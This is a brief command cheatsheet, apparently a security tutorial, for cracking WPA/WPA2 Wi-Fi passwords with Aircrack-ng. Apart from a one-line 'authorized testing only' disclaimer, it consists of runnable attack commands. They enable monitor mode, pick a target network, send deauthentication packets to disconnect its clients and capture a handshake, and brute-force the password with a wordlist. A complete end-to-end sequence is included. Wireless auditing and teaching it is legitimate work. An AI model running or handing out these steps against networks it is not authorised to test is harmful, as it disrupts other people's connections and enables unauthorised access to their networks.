This cheatsheet includes essential commands for wireless network auditing and WPA/WPA2 password cracking using the Aircrack-ng suite.

> ⚠️ For educational and authorized penetration testing only.

bash
# Step 1: Enable Monitor Mode
sudo airmon-ng                       # List available wireless interfaces

sudo airmon-ng start wlan0           # Start monitor mode on wlan0

sudo airmon-ng stop wlan0mon         # Stop monitor mode (return to managed mode)

# Step 2: Discover Wi-Fi Networks
sudo airodump-ng wlan0mon                                 # List all nearby Wi-Fi networks
sudo airodump-ng --bssid <BSSID> -c <channel> -w handshake wlan0mon  # Capture handshake from specific network

# Step 3: Deauthenticate Clients to Capture Handshake
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon                 # Send 5 deauthentication packets

# Step 4: Crack WPA/WPA2 Password
aircrack-ng -w wordlist.txt -b <BSSID> handshake.cap      # Use wordlist to crack captured handshake

# Additional Aircrack-ng Commands
aircrack-ng --help            # Full help menu
aircrack-ng -u                # Processor/SIMD information
aircrack-ng -S                # Benchmark speed
aircrack-ng --simd-list       # List supported SIMD types
aircrack-ng -J file.hccap     # Convert capture to Hashcat format
aircrack-ng -E file.ewsa      # Generate Elcomsoft project file
aircrack-ng -C <macs>         # Merge multiple APs into one virtual AP

# Tools from Aircrack-ng Suite
airmon-ng         # Manage monitor mode
airodump-ng       # Scan and log networks
aireplay-ng       # Inject packets (e.g., deauth attacks)
aircrack-ng       # Crack passwords
airolib-ng        # Manage network/password databases
packetforge-ng    # Create custom packets for injection

# Example: Full Handshake Capture and Crack
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng --bssid <BSSID> -c <CH> -w capture wlan0mon
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
aircrack-ng -w rockyou.txt -b <BSSID> capture.cap

aircrack-ng -w wordlist.txt -b <BSSID> capture.cap

